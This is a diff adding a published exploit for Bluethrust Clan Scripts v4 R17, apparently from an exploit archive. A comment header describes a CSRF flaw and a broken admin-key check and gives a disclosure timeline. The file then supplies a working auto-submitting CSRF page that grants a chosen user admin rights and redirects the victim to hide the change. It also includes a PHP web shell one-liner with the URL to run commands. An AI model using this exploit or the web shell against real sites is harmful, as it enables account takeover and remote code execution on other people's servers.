@@ -1,0 +1,42 @@
+<!--
+Exploit title:  Bluethrust Clan Scripts v4 R17 CSRF & PHP Shell Upload (Admin)
+Exploit: Brandon Murphy https://www.linkedin.com/in/brandonm86
+Vendor Homepage: https://bluethrust.com
+Tested on: Windows 7/Firefox
+Exploit Description:
+Stable with Firefox 44.0. Other browsers may be unstable or may not work. Only Bluethrust Clan Scripts v4 R17 was tested but other versions may be vulnerable!
+CSRF
+
+Note: The developer applied the patch to the webapp without changing the revision number which could cause confusion to customers.
+---------------------
+There is no token check when changing a current user rank thus allowing CSRF to take place. When the code below is executed by an authenticated admin it will grant the defined user Commander/Admin rights.
+
+PHP Shell Upload
+-----------------------
+After CSRF has taken place you can login to your account like normal. Once logged in click "My Profile>Administrator options>Modify Current Theme" or use site.com/members/console.php?cID=61. You can then insert the PHP code of your choosing into Footer. In order to add or edit code you are required to provide a special Admin Key that was defined during install. The key isn't needed as the check is faulty and can be left blank. Just insert your code and click Edit Theme. It will say the key was incorrect, but the PHP code is still inserted.
+e.g. <?php $cmd=$_REQUEST['cmd']; system($cmd); ?> put into the footer code. site.com/themes/destiny/_footer.php?cmd=dir for command execution.
+
+Timeline:
+2/6/2016 - Dev notified of vulnerabilities
+2/6/2016 - Dev acknowledges vulnerabilities
+2/7/2016 - Patch applied and made public
+3/7/2016 - Public Disclosure
+
+Disclaimer:
+I cannot be held accountable for anything you do with this code. 
+You take responsibility for your own actions. For educational and testing purposes only.
+-->
+
+<html>
+    <form action="http://site.com/clan/members/console.php?cID=8" method="POST">
+      <input type="hidden" name="member" value="4"/> <!-- User ID to be granted Admin -->
+      <input type="hidden" name="newrank" value="41"/> <!-- 41 is Commander/Admin -->
+      <input type="hidden" name="reason" value=""/>
+      <input type="hidden" name="freezetime" value="0"/>
+      <input type="hidden" name="submit" value="Set+Rank"/>
+    </form>
+	<script>
+	document.createElement('form').submit.call(document.forms[0]);
+	window.location.href = "http://site.com/clan/members/"; <!-- Redirect admin after CSRF takes place to avoid pop-up notification -->
+	</script>
+</html>
